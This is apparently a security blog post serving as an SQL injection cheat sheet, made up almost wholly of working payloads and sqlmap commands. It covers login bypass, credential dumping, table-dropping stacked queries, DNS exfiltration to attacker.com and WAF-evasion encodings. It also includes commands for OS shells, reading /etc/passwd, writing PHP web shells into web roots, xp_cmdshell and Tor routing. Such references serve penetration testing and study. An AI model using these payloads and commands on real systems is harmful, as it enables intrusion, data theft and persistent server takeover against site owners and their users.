---
layout: post
title: SQL Injection
date: 2025-04-10 17:33 +0300
categories: [Web Security, Server-Side Attacks]
---

## Types of SQL Injection

### 1. In-band SQLi
- **Error-based**: Forces database to generate error messages revealing information about the database structure
  ```sql
  ' OR 1=1 -- -
  ' OR '1'='1' -- -
  ') OR ('1'='1
  ```

- **Union-based**: Uses UNION operator to combine results of two SELECT statements
  ```sql
  ' UNION SELECT 1,2,3 -- -
  ' UNION SELECT username,password,3 FROM users -- -
  ```

### 2. Blind SQLi
- **Boolean-based**: Sends true/false questions to database, observing response differences
  ```sql
  ' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5) -- -
  ' OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' -- -
  ```

- **Time-based**: Delays response if condition is true
  ```sql
  ' OR (SELECT IF(LENGTH(database())=8,SLEEP(5),0)) -- -
  ' OR IF(SUBSTRING(database(),1,1)='i',SLEEP(5),0) -- -
  ```

### 3. Out-of-band SQLi
- Uses external channels to extract data (DNS, HTTP)
```sql
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',DATABASE(),'.attacker.com\\file')) -- -
```

### 4. Stacked Queries
- Executes multiple queries in one statement
  ```sql
  '; DROP TABLE users; -- -
  '; INSERT INTO users VALUES ('hacker','password'); -- -
  ```

## Common SQL Injection Techniques

### Authentication Bypass

```sql
username: admin' -- -
password: anything
```

### Data Exfiltration
```sql
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT username,password,3 FROM users -- -
```

### Database Fingerprinting

- **MySQL**:
  ```sql
  ' OR @@version -- -
  ' UNION SELECT version(),2,3 -- -
  ```
- **MSSQL**:
  ```sql
  ' OR @@version -- -
  ' UNION SELECT @@version,2,3 -- -
  ```
- **PostgreSQL**:
  ```sql
  ' OR version() -- -
  ' UNION SELECT version(),2,3 -- -
  ```
- **Oracle**:
  ```sql
  ' OR banner FROM v$version WHERE rownum=1 -- -
  ' UNION SELECT banner,2,3 FROM v$version -- -
  ```

## WAF Bypass Techniques

### 1. String Obfuscation
- **Case switching**: `UnIoN SeLeCt`
- **URL encoding**: `%55%4E%49%4F%4E%20%53%45%4C%45%43%54`
- **Double URL encoding**: `%2555%254E%2549%254F%254E`
- **Unicode encoding**: `uni/**/on sel/**/ect`
- **Comment injection**: `UN/**/ION SEL/**/ECT`
- **Whitespace variants**: Replace spaces with tabs, line breaks, comments

### 2. Logic Alternatives
- Replace `OR 1=1` with `OR 1<2`
- Replace `=` with `LIKE` or `REGEXP`
- Use `/*!50000 UNION*/` for MySQL version-based comments

### 3. Hex/CHAR Encoding
```sql
' UNION SELECT CHAR(65,66,67),2,3 -- -
SELECT 0x3c3f706870 -- Hex encoding for '<?php'
```

### 4. Function Alternations

- Use equivalent functions:
  - `SUBSTRING` → `MID`, `SUBSTR`
  - `CONCAT` → `||` (Oracle, PostgreSQL) or `+` (MSSQL)

### 5. WAF Evasion Strings

```sql
' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3 -- -
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3 -- -
' UniON/**/sEleCT 1,2,3 -- -
```

## Advanced SQLMap Usage

### Basic Command Structure
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

### Target Specification
```bash
# Single URL
sqlmap -u "http://target.com/page.php?id=1"

# From Burp request file
sqlmap -r request.txt

# Multiple targets
sqlmap -m targets.txt

# Crawl website
sqlmap -u "http://target.com" --crawl=3
```

### Request Customization
```bash
# Set cookies
sqlmap -u "http://target.com" --cookie="PHPSESSID=abc123"

# Set HTTP headers
sqlmap -u "http://target.com" --headers="User-Agent: Mozilla/5.0\nReferer: http://google.com"

# HTTP method
sqlmap -u "http://target.com" --data="username=test&password=test" --method=POST

# Custom parameters
sqlmap -u "http://target.com" --param-filter="id"
```

### Authentication
```bash
# Basic authentication
sqlmap -u "http://target.com" --auth-type=basic --auth-cred="username:password"

# Form authentication
sqlmap -u "http://target.com/login.php" --data="username=admin&password=admin" --forms

# HTTP Digest authentication
sqlmap -u "http://target.com" --auth-type=digest --auth-cred="username:password"
```

### Injection Techniques
```bash
# Specify techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Set database
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Use specific payloads
sqlmap -u "http://target.com/page.php?id=1" --prefix=")" --suffix="-- -"
```

### Data Extraction
```bash
# Get databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Get columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name -C "col1,col2" --dump

# Search for specific data
sqlmap -u "http://target.com/page.php?id=1" --search -C admin,password,credit
```

### WAF Evasion Options
```bash
# Tamper scripts (can be chained with comma)
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between

# Random user agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Time delay
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Tor routing
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
```

### Advanced Features
```bash
# OS Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL Shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# File read/write
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Database takeover
sqlmap -u "http://target.com/page.php?id=1" --schema

# Vulnerable parameter finder
sqlmap -u "http://target.com/page.php" --forms --batch --crawl=10 --cookie="security=low; PHPSESSID=a" --random-agent --level=5 --risk=3
```

### Popular Tamper Scripts
```bash
# base64encode       - Base64 encodes all characters in payload
# between            - Replaces greater/less than with 'NOT BETWEEN 0 AND #'
# charencode         - URL encodes all characters in payload
# charunicodeencode  - Unicode-URL encodes non-encoded characters
# concat2concatws    - Replaces 'CONCAT(' with 'CONCAT_WS(0x20,'
# equaltolike        - Replaces all '=' with 'LIKE'
# space2comment      - Replaces spaces with comments '/**/'
# space2hash         - Replaces spaces with # followed by random string and new line
# space2morehash     - Replaces spaces with combination of comment and hash
# space2plus         - Replaces spaces with '+'
# unionalltounion    - Replaces 'UNION ALL SELECT' with 'UNION SELECT'
# securesphere       - Specific bypasses for SecureSphere WAF
# varnish            - Adds an HTTP header 'X-originating-IP' for Varnish XSS
# modsec             - Designed to evade ModSecurity WAF
```

### SQLMap Output
```bash
# Verbose output
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Output to file
sqlmap -u "http://target.com/page.php?id=1" -o --output-dir=/path/to/output

# Resume interrupted scan
sqlmap -u "http://target.com/page.php?id=1" --session=previous_session

# Save traffic to PCAP
sqlmap -u "http://target.com/page.php?id=1" --capture=traffic.pcap
```

## DBMS-Specific Payloads

### MySQL
```sql
-- Comment syntax
# MySQL comment
-- Another comment
/*Multi-line comment*/

-- File operations
SELECT LOAD_FILE('/etc/passwd');
SELECT 'data' INTO OUTFILE '/var/www/shell.php';

-- Information gathering
SELECT @@version;
SELECT user();
SELECT database();
SELECT table_name FROM information_schema.tables;
```

### MSSQL
```sql
-- Comment syntax
-- MSSQL comment

-- Information gathering
SELECT @@version;
SELECT CURRENT_USER;
SELECT DB_NAME();
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;

-- Advanced commands
EXEC xp_cmdshell 'whoami';
```

### PostgreSQL
```sql
-- Comment syntax
-- Postgres comment
/*Multi-line comment*/

-- Information gathering
SELECT version();
SELECT current_user;
SELECT current_database();
SELECT table_name FROM information_schema.tables;

-- File operations
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/shell.php';
```

### Oracle
```sql
-- Comment syntax
-- Oracle comment

-- Information gathering
SELECT banner FROM v$version;
SELECT user FROM dual;
SELECT global_name FROM global_name;
SELECT owner, table_name FROM all_tables;

-- PL/SQL execution
EXECUTE IMMEDIATE 'SELECT 1 FROM dual';
```

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [PayloadsAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
